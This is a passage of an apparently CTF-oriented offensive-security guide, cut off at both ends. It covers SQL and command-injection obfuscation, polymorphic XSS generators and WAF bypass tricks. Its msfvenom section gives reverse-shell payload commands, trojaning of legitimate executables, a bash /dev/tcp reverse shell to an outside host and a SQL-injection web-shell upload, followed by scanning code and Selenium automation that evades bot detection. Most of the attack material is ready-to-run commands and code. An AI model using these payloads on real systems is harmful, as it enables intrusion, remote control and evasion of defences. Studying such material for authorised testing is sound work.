#!/usr/bin/env python3
import random

def obfuscate_sql(payload):
    """
    Apply multiple obfuscation techniques to SQL injection payload
    """
    techniques = []
    
    # 1. Random case
    def random_case(s):
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
    
    techniques.append(("Random case", random_case(payload)))
    
    # 2. Comment insertion
    def insert_comments(s):
        words = s.split()
        return '/**/'.join(words)
    
    techniques.append(("Comments", insert_comments(payload)))
    
    # 3. Whitespace variation
    def whitespace_variation(s):
        return s.replace(' ', '%09')  # Use tab
    
    techniques.append(("Tab whitespace", whitespace_variation(payload)))
    
    # 4. Encoding
    def url_encode(s):
        return ''.join(f'%{ord(c):02X}' if c == ' ' else c for c in s)
    
    techniques.append(("URL encoded spaces", url_encode(payload)))
    
    return techniques

# Usage
original = "' OR 1=1--"
results = obfuscate_sql(original)

print(f"Original: {original}\n")
for name, obfuscated in results:
    print(f"{name}:")
    print(f"  {obfuscated}\n")
```

### Command Injection Obfuscation

**Variable Expansion:**

```bash
# Original
cat /etc/passwd

# Using variables
c$()at /etc/passwd
c${x}at /etc/passwd
c\at /etc/passwd

# Empty variable
cat$IFS/etc/passwd
```

**Encoding:**

```bash
# Hex encoding
$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Octal encoding
$(printf "\143\141\164 /etc/passwd")
```

**Alternative Separators:**

```bash
# Instead of space, use IFS
cat$IFS/etc/passwd

# Tab
cat%09/etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Concatenation
cat</etc/passwd
```

**Wildcards & Globbing:**

```bash
# Using wildcards
/b??/c?t /etc/passwd
/bin/c[a-z]t /etc/passwd

# Path manipulation
/bin/./cat /etc/passwd
/bin/cat /e??/p??s??
```

**Quote Manipulation:**

```bash
# Single quotes
c'a't /etc/passwd

# Double quotes
c"a"t /etc/passwd

# Mixed quotes
c'a'"t" /etc/passwd

# Backslash
c\a\t /etc/passwd
```

---

## Polymorphic Code

Polymorphic code changes its appearance while maintaining functionality, useful for evading signature-based detection in security testing.

### Polymorphic XSS Payloads

**Technique 1: Dynamic Function Names:**

```javascript
// Generate different payload each time
function generatePolyXSS() {
    const functionNames = ['eval', 'Function', 'setTimeout', 'setInterval'];
    const encodings = ['atob', 'unescape', 'String.fromCharCode'];
    
    const fn = functionNames[Math.floor(Math.random() * functionNames.length)];
    const enc = encodings[Math.floor(Math.random() * encodings.length)];
    
    let payload = "alert(document.cookie)";
    
    if (enc === 'atob') {
        payload = btoa(payload);
        return `${fn}(${enc}('${payload}'))`;
    } else if (enc === 'unescape') {
        payload = payload.split('').map(c => `%${c.charCodeAt(0).toString(16)}`).join('');
        return `${fn}(${enc}('${payload}'))`;
    } else {
        const codes = payload.split('').map(c => c.charCodeAt(0)).join(',');
        return `${fn}(String.fromCharCode(${codes}))`;
    }
}

// Each call produces different payload
console.log(generatePolyXSS());
console.log(generatePolyXSS());
```

**Technique 2: Random Whitespace & Comments:**

```python
#!/usr/bin/env python3
import random
import string

def add_random_junk(payload):
    """
    Add random whitespace and comments to JavaScript payload
    """
    junk_types = [
        lambda: ' ' * random.randint(1, 5),
        lambda: '\t' * random.randint(1, 3),
        lambda: '\n' * random.randint(1, 2),
        lambda: f'/*{random_string(5)}*/',
        lambda: f'//{random_string(10)}\n',
    ]
    
    result = []
    for char in payload:
        result.append(char)
        if random.random() > 0.7:  # 30% chance to add junk
            junk = random.choice(junk_types)()
            result.append(junk)
    
    return ''.join(result)

def random_string(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

# Usage
original = "alert(1)"
for i in range(3):
    print(f"Variant {i+1}:")
    print(add_random_junk(original))
    print()
```

### Polymorphic SQL Injection

**Dynamic Query Construction:**

```python
#!/usr/bin/env python3
import random

def generate_poly_sqli():
    """
    Generate polymorphic SQL injection payloads
    """
    # Different comment styles
    comments = ['--', '#', '/**/']
    
    # Different TRUE conditions
    true_conditions = [
        '1=1',
        '2>1',
        "'a'='a'",
        'true',
        '1 LIKE 1',
        '1 IN (1,2,3)',
        '1 BETWEEN 0 AND 2'
    ]
    
    # Different operators
    or_operators = ['OR', '||', 'OR']
    
    # Random whitespace
    ws_options = [' ', '%09', '%0a', '/**/', '+']
    
    # Build payload
    comment = random.choice(comments)
    condition = random.choice(true_conditions)
    or_op = random.choice(or_operators)
    ws = random.choice(ws_options)
    
    payload = f"'{ws}{or_op}{ws}{condition}{comment}"
    
    return payload

# Generate multiple unique payloads
for i in range(5):
    print(f"Payload {i+1}: {generate_poly_sqli()}")
```

### Polymorphic Command Injection

**Variable Command Construction:**

```python
#!/usr/bin/env python3
import random

def generate_poly_command(base_cmd):
    """
    Generate polymorphic command injection payloads
    """
    techniques = []
    
    # 1. Variable insertion
    var_names = ['x', 'y', 'z', 'a', 'b']
    var = random.choice(var_names)
    techniques.append(f"{base_cmd[0]}${{{var}}}{base_cmd[1:]}")
    
    # 2. Quote insertion
    quote_pos = random.randint(1, len(base_cmd)-1)
    techniques.append(f"{base_cmd[:quote_pos]}'{base_cmd[quote_pos:]}")
    
    # 3. Backslash escaping
    escape_pos = random.randint(1, len(base_cmd)-1)
    techniques.append(f"{base_cmd[:escape_pos]}\\{base_cmd[escape_pos:]}")
    
    # 4. Wildcard substitution
    if len(base_cmd) > 2:
        wildcard_pos = random.randint(1, len(base_cmd)-1)
        techniques.append(f"{base_cmd[:wildcard_pos]}?{base_cmd[wildcard_pos+1:]}")
    
    # 5. Encoding
    encoded = ''.join(f'\\x{ord(c):02x}' for c in base_cmd)
    techniques.append(f"$(echo -e '{encoded}')")
    
    return random.choice(techniques)

# Generate variants
cmd = "cat"
for i in range(5):
    print(f"Variant {i+1}: {generate_poly_command(cmd)}")
```

---

## Evasion Techniques

Evasion techniques bypass security controls like WAFs, IDS/IPS, and input filters during authorized security testing.

### WAF Bypass Strategies

**HTTP Parameter Pollution (HPP):**

```bash
# Send duplicate parameters
# Some WAFs check first, application uses last

# Normal request (blocked)
POST /search?q=<script>alert(1)</script>

# HPP bypass
POST /search?q=legitimate&q=<script>alert(1)</script>

# In POST body
q=legitimate&q=<script>alert(1)</script>
```

**HTTP Verb Tampering:**

```bash
# WAF blocks POST
POST /admin HTTP/1.1

# Try alternative methods
GET /admin HTTP/1.1
PUT /admin HTTP/1.1
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1

# Custom methods
TRACE /admin HTTP/1.1
CONNECT /admin HTTP/1.1
```

**Case Manipulation:**

```bash
# Mixed case in payloads
<ScRiPt>alert(1)</ScRiPt>

# In SQL
' UnIoN SeLeCt 1,2,3--

# In paths
/AdMiN/dashboard
```

**Content-Type Manipulation:**

```bash
# Change Content-Type to bypass filters
POST /api/user HTTP/1.1
Content-Type: application/xml

<user>
  <name><![CDATA[<script>alert(1)</script>]]></name>
</user>

# Or use multipart/form-data
POST /api/user HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="name"

<script>alert(1)</script>
------Boundary--
```

**Character Set Manipulation:**

```bash
# UTF-7 encoding (legacy)
POST /search HTTP/1.1
Content-Type: text/html; charset=UTF-7

+ADw-script+AD4-alert(1)+ADw-/script+AD4-

# UTF-16 encoding
Content-Type: text/html; charset=UTF-16BE

%00<%00s%00c%00r%00i%00p%00t%00>
```

### Payload Splitting

**Chunked Transfer Encoding:**

```bash
# Split payload across chunks to evade pattern matching

POST /search HTTP/1.1
Transfer-Encoding: chunked

5
<scri
2
pt
3
>al
4
ert(
2
1)
9
</script>
0
```

**Multiline Payloads:**

```bash
# Split across multiple lines
POST /comment HTTP/1.1

comment=<script>
alert(1)
</script>

# Using line continuation
comment=<script>\
alert(1)\
</script>
```

### Timing-Based Evasion

**Rate Limiting Bypass:**

```python
#!/usr/bin/env python3
import requests
import time

def slow_scan(url, payloads, delay=5):
    """
    Send payloads slowly to evade rate limiting
    """
    for payload in payloads:
        response = requests.post(url, data={'q': payload})
        print(f"Tested: {payload[:50]}... Status: {response.status_code}")
        time.sleep(delay)  # Wait between requests

# Usage
payloads = ["' OR 1=1--", "<script>alert(1)</script>", "; cat /etc/passwd"]
slow_scan("http://target.com/search", payloads, delay=10)
```

---

## Msfvenom Usage

Msfvenom is Metasploit's payload generator, useful for creating encoded/obfuscated payloads in CTF reverse shell challenges.

### Basic Syntax

```bash
msfvenom -p <payload> <options> -f <format> -o <output_file>

# Components:
# -p : payload type
# -f : output format
# -o : output file
# -e : encoder (for obfuscation)
# -i : encoding iterations
# -b : bad characters to avoid
```

### Web Shell Payloads

**PHP Reverse Shell:**

```bash
# Basic PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

# Encoded PHP shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -e php/base64 > encoded_shell.php

# Remove PHP tags for injection
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw | tail -n +2 | head -n -2 > shell_no_tags.php
```

**JSP Reverse Shell:**

```bash
# For Java web applications
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.jsp

# WAR file (for Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
```

**ASP/ASPX Shells:**

```bash
# Classic ASP
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp > shell.asp

# ASP.NET
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > shell.aspx
```

### Encoding & Obfuscation with Msfvenom

**List Available Encoders:**

```bash
msfvenom --list encoders

# Common encoders:
# - x86/shikata_ga_nai (excellent)
# - cmd/powershell_base64
# - php/base64
# - x86/call4_dword_xor
```

**Apply Encoding:**

```bash
# Single encoding iteration
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f elf -e x86/shikata_ga_nai > encoded_shell

# Multiple iterations (more obfuscation)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f elf -e x86/shikata_ga_nai -i 10 > heavily_encoded_shell
```

**Avoid Bad Characters:**

```bash
# Exclude null bytes and other bad chars
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f c -b '\x00\x0a\x0d' -e x86/shikata_ga_nai

# Common bad characters:
# \x00 - null byte
# \x0a - line feed
# \x0d - carriage return
# \x20 - space
```

### Platform-Specific Payloads

**Linux Payloads:**

```bash
# ELF binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf

# Python payload
msfvenom -p python/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.py

# Bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw
```

**Windows Payloads:**

```bash
# EXE file
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe

# PowerShell command
msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.5 LPORT=4444 -f raw

# DLL injection
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > shell.dll

# Service executable
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe-service > service.exe
```

### Output Formats

**List Available Formats:**

```bash
msfvenom --list formats

# Common formats:
# - raw : raw payload
# - c : C array
# - python : Python script
# - exe : Windows executable
# - elf : Linux executable
# - asp, aspx, jsp, php : web shells
```

**Format Examples:**

```bash
# C array (for exploit development)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Output:
# unsigned char buf[] = 
# "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52...";

# Python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python

# PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh > shell.ps1
```

### Advanced Msfvenom Techniques

**Template Injection:**

```bash
# Inject payload into existing binary
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x legitimate.exe -f exe > trojan.exe

# Keep original functionality
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x legitimate.exe -k -f exe > trojan_working.exe
```

**Custom Payload Configuration:**

```bash
# Set specific options
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  AutoRunScript="migrate -f" \
  -f exe > advanced_shell.exe

# Staged vs stageless
# Staged (smaller, requires metasploit handler)
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > staged.exe

# Stageless (larger, self-contained)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > stageless.exe
```

### Setting Up Listener

**Netcat Listener (for simple shells):**

```bash
# Listen for connection
nc -lvnp 4444

# With verbose output
nc -lvnp 4444 -vv
```

**Metasploit Handler (for meterpreter):**

```bash
# Start msfconsole
msfconsole -q

# Configure handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j

# For multiple sessions
set AutoRunScript "migrate -f"
```

### Practical CTF Examples

**File Upload Bypass:**

```bash
# Generate PHP shell with different extension
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.phtml

# Or embed in image
cat image.jpg shell.php > malicious.jpg
```

**Command Injection Payload:**

```bash
# Generate bash payload
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw

# Output can be used in command injection:
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

**SQL Injection Shell Upload:**

```bash
# Generate PHP shell without tags
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw | \
  tail -n +2 | head -n -2 > payload.txt

# Use in SQL injection:
# ' UNION SELECT '<?php', 'shell_content', '?>' INTO OUTFILE '/var/www/html/shell.php'--
```

This comprehensive guide provides practical techniques for payload crafting and obfuscation in authorized security testing scenarios, with emphasis on CTF applications and proper tool usage.

---

# Web Scraping & Automation

Web scraping and automation are essential for reconnaissance, data extraction, vulnerability testing, and solving complex CTF challenges that involve dynamic content, multi-step processes, or large-scale data analysis.

---

## Automated Testing Frameworks

Automated frameworks streamline repetitive testing tasks, enabling efficient vulnerability discovery and systematic exploitation in CTF scenarios.

### Python Requests-Based Automation

**Basic HTTP Automation:**

```python
#!/usr/bin/env python3
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class WebAutomation:
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url
        self.session = requests.Session()
        self.timeout = timeout
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            method_whitelist=["HEAD", "GET", "OPTIONS", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def login(self, username, password):
        """Authenticate and maintain session"""
        login_url = f"{self.base_url}/login"
        data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(login_url, data=data, timeout=self.timeout)
        
        if response.status_code == 200:
            print(f"[+] Login successful for {username}")
            return True
        else:
            print(f"[-] Login failed: {response.status_code}")
            return False
    
    def get_csrf_token(self, url):
        """Extract CSRF token from page"""
        response = self.session.get(url, timeout=self.timeout)
        
        # Multiple methods to extract token
        import re
        
        # Method 1: From meta tag
        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
        if match:
            return match.group(1)
        
        # Method 2: From hidden input
        match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', response.text)
        if match:
            return match.group(1)
        
        # Method 3: From cookie
        if 'csrf_token' in self.session.cookies:
            return self.session.cookies['csrf_token']
        
        return None
    
    def test_endpoint(self, path, method='GET', data=None, params=None):
        """Test single endpoint with error handling"""
        url = f"{self.base_url}{path}"
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, timeout=self.timeout)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, timeout=self.timeout)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, timeout=self.timeout)
            else:
                print(f"[-] Unsupported method: {method}")
                return None
            
            return {
                'url': url,
                'status': response.status_code,
                'length': len(response.content),
                'headers': dict(response.headers),
                'body': response.text
            }
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing {url}: {e}")
            return None

# Usage example
automation = WebAutomation('http://target.com')
automation.login('admin', 'password123')

# Test multiple endpoints
endpoints = ['/api/users', '/api/posts', '/api/settings']
for endpoint in endpoints:
    result = automation.test_endpoint(endpoint)
    if result:
        print(f"[*] {endpoint}: Status {result['status']}, Length {result['length']}")
```

**Concurrent Request Testing:**

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

class ConcurrentTester:
    def __init__(self, base_url, max_workers=10):
        self.base_url = base_url
        self.max_workers = max_workers
        self.results = []
    
    def test_single_payload(self, payload_data):
        """Test single payload against endpoint"""
        endpoint, payload = payload_data
        url = f"{self.base_url}{endpoint}"
        
        try:
            start_time = time.time()
            response = requests.post(url, data=payload, timeout=10)
            elapsed = time.time() - start_time
            
            return {
                'endpoint': endpoint,
                'payload': payload,
                'status': response.status_code,
                'time': elapsed,
                'length': len(response.content),
                'success': self.check_success(response)
            }
        except Exception as e:
            return {
                'endpoint': endpoint,
                'payload': payload,
                'error': str(e)
            }
    
    def check_success(self, response):
        """Define success criteria"""
        success_indicators = [
            response.status_code == 200,
            'success' in response.text.lower(),
            'error' not in response.text.lower(),
            len(response.content) > 100
        ]
        return all(success_indicators)
    
    def run_concurrent_tests(self, test_cases):
        """Execute tests concurrently"""
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.test_single_payload, tc): tc for tc in test_cases}
            
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
                
                if 'error' not in result:
                    status = "✓" if result.get('success') else "✗"
                    print(f"{status} {result['endpoint']} - Status: {result['status']} - Time: {result['time']:.2f}s")
        
        return self.results
    
    def analyze_results(self):
        """Analyze test results"""
        successful = [r for r in self.results if r.get('success')]
        failed = [r for r in self.results if not r.get('success') and 'error' not in r]
        errors = [r for r in self.results if 'error' in r]
        
        print(f"\n[*] Results Summary:")
        print(f"    Total: {len(self.results)}")
        print(f"    Successful: {len(successful)}")
        print(f"    Failed: {len(failed)}")
        print(f"    Errors: {len(errors)}")
        
        # Find timing anomalies
        times = [r['time'] for r in self.results if 'time' in r]
        if times:
            avg_time = sum(times) / len(times)
            slow_requests = [r for r in self.results if r.get('time', 0) > avg_time * 2]
            
            if slow_requests:
                print(f"\n[!] Slow requests detected (>{avg_time*2:.2f}s):")
                for r in slow_requests:
                    print(f"    {r['endpoint']}: {r['time']:.2f}s")

# Usage
tester = ConcurrentTester('http://target.com', max_workers=20)

# Generate test cases
test_cases = []
for i in range(100):
    test_cases.append(('/api/test', {'id': i, 'data': f'test{i}'}))

# Run tests
results = tester.run_concurrent_tests(test_cases)
tester.analyze_results()
```

### Custom Testing Framework

**Modular CTF Testing Framework:**

```python
#!/usr/bin/env python3
import requests
import re
import json
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from enum import Enum

class VulnType(Enum):
    SQLI = "SQL Injection"
    XSS = "Cross-Site Scripting"
    IDOR = "Insecure Direct Object Reference"
    SSRF = "Server-Side Request Forgery"
    LFI = "Local File Inclusion"

@dataclass
class TestResult:
    vuln_type: VulnType
    endpoint: str
    payload: str
    vulnerable: bool
    evidence: str
    response_code: int
    response_time: float

class VulnerabilityScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[TestResult] = []
        
        # Define payloads for each vulnerability type
        self.payloads = {
            VulnType.SQLI: [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' UNION SELECT NULL--",
                "1' AND 1=2 UNION SELECT NULL--",
                "admin'--",
            ],
            VulnType.XSS: [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "'-alert(1)-'",
            ],
            VulnType.IDOR: [
                # Generated dynamically based on context
            ],
            VulnType.LFI: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "....\/....\/....\/etc/passwd",
            ]
        }
        
        # Define detection patterns
        self.detection_patterns = {
            VulnType.SQLI: [
                r"SQL syntax.*?error",
                r"mysql_fetch",
                r"PostgreSQL.*?ERROR",
                r"ORA-\d{5}",
                r"Microsoft SQL Server",
            ],
            VulnType.XSS: [
                r"<script>alert\(1\)</script>",
                r"<img src=x onerror=alert\(1\)>",
            ],
            VulnType.LFI: [
                r"root:.*?:/bin/bash",
                r"daemon:.*?:/usr/sbin",
                r"\[boot loader\]",  # Windows boot.ini
            ]
        }
    
    def scan_endpoint(self, endpoint: str, param: str, vuln_type: VulnType) -> List[TestResult]:
        """Scan single endpoint for specific vulnerability type"""
        results = []
        payloads = self.payloads.get(vuln_type, [])
        patterns = self.detection_patterns.get(vuln_type, [])
        
        for payload in payloads:
            result = self._test_payload(endpoint, param, payload, vuln_type, patterns)
            results.append(result)
            
            if result.vulnerable:
                print(f"[!] VULNERABLE - {vuln_type.value}")
                print(f"    Endpoint: {endpoint}")
                print(f"    Payload: {payload}")
                print(f"    Evidence: {result.evidence[:100]}...")
        
        return results
    
    def _test_payload(self, endpoint: str, param: str, payload: str, 
                     vuln_type: VulnType, patterns: List[str]) -> TestResult:
        """Test single payload against endpoint"""
        url = f"{self.base_url}{endpoint}"
        
        import time
        start = time.time()
        
        try:
            # Try both GET and POST
            response = self.session.get(url, params={param: payload}, timeout=10)
            elapsed = time.time() - start
            
            # Check for vulnerability indicators
            vulnerable = False
            evidence = ""
            
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    vulnerable = True
                    evidence = match.group(0)
                    break
            
            # Additional checks based on vuln type
            if vuln_type == VulnType.XSS:
                if payload in response.text:
                    vulnerable = True
                    evidence = "Payload reflected unencoded"
            
            return TestResult(
                vuln_type=vuln_type,
                endpoint=endpoint,
                payload=payload,
                vulnerable=vulnerable,
                evidence=evidence,
                response_code=response.status_code,
                response_time=elapsed
            )
        
        except Exception as e:
            return TestResult(
                vuln_type=vuln_type,
                endpoint=endpoint,
                payload=payload,
                vulnerable=False,
                evidence=f"Error: {str(e)}",
                response_code=0,
                response_time=0
            )
    
    def scan_all(self, endpoints: List[Dict[str, str]], vuln_types: List[VulnType]):
        """Scan all endpoints for all vulnerability types"""
        print(f"[*] Starting comprehensive scan...")
        print(f"    Endpoints: {len(endpoints)}")
        print(f"    Vulnerability types: {len(vuln_types)}")
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['path']
            param = endpoint_info['param']
            
            print(f"\n[*] Scanning: {endpoint} (param: {param})")
            
            for vuln_type in vuln_types:
                results = self.scan_endpoint(endpoint, param, vuln_type)
                self.results.extend(results)
        
        self.generate_report()
    
    def generate_report(self):
        """Generate vulnerability report"""
        vulnerabilities = [r for r in self.results if r.vulnerable]
        
        print("\n" + "="*70)
        print("VULNERABILITY SCAN REPORT")
        print("="*70)
        
        if not vulnerabilities:
            print("\n[+] No vulnerabilities detected")
            return
        
        # Group by vulnerability type
        by_type = {}
        for vuln in vulnerabilities:
            if vuln.vuln_type not in by_type:
                by_type[vuln.vuln_type] = []
            by_type[vuln.vuln_type].append(vuln)
        
        for vuln_type, vulns in by_type.items():
            print(f"\n[!] {vuln_type.value}: {len(vulns)} found")
            for v in vulns:
                print(f"    - {v.endpoint} (param: {v.payload[:30]}...)")
        
        print("\n" + "="*70)

# Usage
scanner = VulnerabilityScanner('http://target.com')

endpoints = [
    {'path': '/search', 'param': 'q'},
    {'path': '/user', 'param': 'id'},
    {'path': '/file', 'param': 'path'},
]

vuln_types = [VulnType.SQLI, VulnType.XSS, VulnType.LFI]

scanner.scan_all(endpoints, vuln_types)
```

---

## Selenium for Dynamic Content

Selenium automates browser interactions, essential for testing JavaScript-heavy applications, solving CAPTCHAs in CTFs, and handling complex authentication flows.

### Selenium Setup & Configuration

**Installation:**

```bash
# Install Selenium
pip install selenium

# Install webdriver-manager (automatic driver management)
pip install webdriver-manager

# Manual driver installation:
# Chrome: https://chromedriver.chromium.org/
# Firefox: https://github.com/mozilla/geckodriver/releases
```

**Basic Selenium Configuration:**

```python
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

class SeleniumAutomation:
    def __init__(self, headless=True):
        """Initialize Selenium with Chrome"""
        chrome_options = Options()
        
        if headless:
            chrome_options.add_argument('--headless')
        
        # Additional options for stability
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        # Disable automation detection
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Initialize driver
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=chrome_options)
        
        # Set timeouts
        self.driver.implicitly_wait(10)
        self.driver.set_page_load_timeout(30)
        
        # Execute CDP commands to prevent detection
        self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    
    def navigate(self, url):
        """Navigate to URL"""
        print(f"[*] Navigating to: {url}")
        self.driver.get(url)
    
    def wait_for_element(self, selector, by=By.CSS_SELECTOR, timeout=10):
        """Wait for element to be present"""
        try:
            element = WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((by, selector))
            )
            return element
        except Exception as e:
            print(f"[-] Element not found: {selector}")
            return None
    
    def click_element(self, selector, by=By.CSS_SELECTOR):
        """Click element with wait"""
        element = self.wait_for_element(selector, by)
        if element:
            element.click()
            return True
        return False
    
    def input_text(self, selector, text, by=By.CSS_SELECTOR):
        """Input text into element"""
        element = self.wait_for_element(selector, by)
        if element:
            element.clear()
            element.send_keys(text)
            return True
        return False
    
    def get_text(self, selector, by=By.CSS_SELECTOR):
        """Get element text"""
        element = self.wait_for_element(selector, by)
        if element:
            return element.text
        return None
    
    def execute_js(self, script):
        """Execute JavaScript"""
        return self.driver.execute_script(script)
    
    def take_screenshot(self, filename='screenshot.png'):
        """Take screenshot"""
        self.driver.save_screenshot(filename)
        print(f"[+] Screenshot saved: {filename}")
    
    def get_cookies(self):
        """Get all cookies"""
        return self.driver.get_cookies()
    
    def add_cookie(self, cookie_dict):
        """Add cookie"""
        self.driver.add_cookie(cookie_dict)
    
    def close(self):
        """Close browser"""
        self.driver.quit()

# Usage example
automation = SeleniumAutomation(headless=False)
automation.navigate('http://target.com')
automation.input_text('#username', 'admin')
automation.input_text('#password', 'password123')
automation.click_element('#login-button')
automation.close()
```

### Handling Dynamic Content

**Wait for AJAX/JavaScript:**

```python
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time

class DynamicContentHandler:
    def __init__(self, driver):
        self.driver = driver
    
    def wait_for_ajax_complete(self, timeout=30):
        """Wait for jQuery AJAX to complete"""
        WebDriverWait(self.driver, timeout).until(
            lambda d: d.execute_script('return jQuery.active == 0')
        )
    
    def wait_for_element_visible(self, selector, timeout=10):
        """Wait for element to be visible"""
        element = WebDriverWait(self.driver, timeout).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR, selector))
        )
        return element
    
    def wait_for_text_present(self, selector, text, timeout=10):
        """Wait for specific text in element"""
        WebDriverWait(self.driver, timeout).until(
            EC.text_to_be_present_in_element((By.CSS_SELECTOR, selector), text)
        )
    
    def wait_for_attribute_change(self, selector, attribute, value, timeout=10):
        """Wait for attribute to have specific value"""
        WebDriverWait(self.driver, timeout).until(
            lambda d: d.find_element(By.CSS_SELECTOR, selector).get_attribute(attribute) == value
        )
    
    def wait_for_page_load(self):
        """Wait for page to fully load"""
        WebDriverWait(self.driver, 30).until(
            lambda d: d.execute_script('return document.readyState') == 'complete'
        )
    
    def scroll_to_element(self, element):
        """Scroll element into view"""
        self.driver.execute_script("arguments[0].scrollIntoView(true);", element)
        time.sleep(0.5)  # Wait for scroll animation
    
    def infinite_scroll(self, scroll_pause_time=2):
        """Handle infinite scroll pages"""
        last_height = self.driver.execute_script("return document.body.scrollHeight")
        
        while True:
            # Scroll down
            self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(scroll_pause_time)
            
            # Calculate new scroll height
            new_height = self.driver.execute_script("return document.body.scrollHeight")
            
            if new_height == last_height:
                break
            
            last_height = new_height
    
    def extract_dynamic_table(self, table_selector):
